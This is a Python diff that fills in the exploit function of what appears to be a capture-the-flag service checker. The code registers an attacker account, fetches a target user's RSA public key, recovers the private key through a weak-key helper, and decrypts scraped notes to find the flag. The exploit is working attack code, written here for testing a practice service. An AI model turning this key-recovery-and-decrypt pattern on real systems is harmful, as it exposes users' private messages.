@@ -8,6 +8,8 @@ import string
 from httpx import AsyncClient
 from typing import Optional
 from logging import LoggerAdapter
+from bs4 import BeautifulSoup
+import re
 
 
 import checker_util_func
@@ -102,13 +104,57 @@ async def exploit_test(
     client: AsyncClient,
     db: ChainDB,
     logger: LoggerAdapter,
+    searcher: FlagSearcher,
 ) -> None:
-    email, password = await checker_util_func.create_user(db, client, logger, public_key= None)
-    MumbleException("Could not create user")
+    print("attacke hier")
+    print(task.attack_info)
+    print(task.flag_hash)
+    print(task.flag_regex)
 
-    notes = await checker_util_func.get_all_notes(db, client, logger)
-    print(notes)
-    #rsa.PrivateKey.load_pkcs1()
+    target_email = task.attack_info
+    email_attacker, password = await checker_util_func.create_user(db, client, logger, public_key= None)
+    public_key = await checker_util_func.get_user_of_userlist(db, client, logger, email = target_email)
+    # response = await client.get("/userlist", follow_redirects=True)
+    # soup = BeautifulSoup(response.text, "html.parser")
+    # li = soup.find_all("li")
+    # li = [x.text for x in li]
+    # li = [x.split(" ") for x in li]
+    # li = filter(lambda x: target_email + '\n' in x, li)
+    # li = filter(lambda x: x != '' and x != '\n' and x != target_email + '\n', list(li)[0])
+    # public_key = list(li)
+    # public_key = public_key[1].strip()
+    print("public_key hier")
+    print(public_key)
+    public_key = checker_util_func.format_rsa_public_key(public_key)
+    key = rsa.PublicKey.load_pkcs1(public_key.encode())
+    private_key = checker_util_func.expprime(key)
+    private_key = private_key.save_pkcs1().decode()
+    print("private_key hier")
+    print(private_key)
+
+    get_all_notes = await client.get("/")
+    soup_html = BeautifulSoup(get_all_notes.text, "html.parser")
+    li = soup_html.find_all("li")
+    li = [x.text for x in li]
+    li = [x.split(" ") for x in li]
+    li = [x.strip() for sublist in li for x in sublist]
+    li = [x for x in li if x != '']
+
+    for i in li:
+        try:
+            message = i
+            message = message[2:-1]
+            message = message.encode()
+            message = message.decode('unicode_escape').encode('latin-1')
+            decrypted_message = checker_util_func.decryption_of_message(message, private_key)
+            print(decrypted_message)
+            print("flagggg hier")
+            if flag := searcher.search_flag(decrypted_message):
+                return flag
+        except:
+            pass
+    raise MumbleException("flag not found")
+    
 
 
     
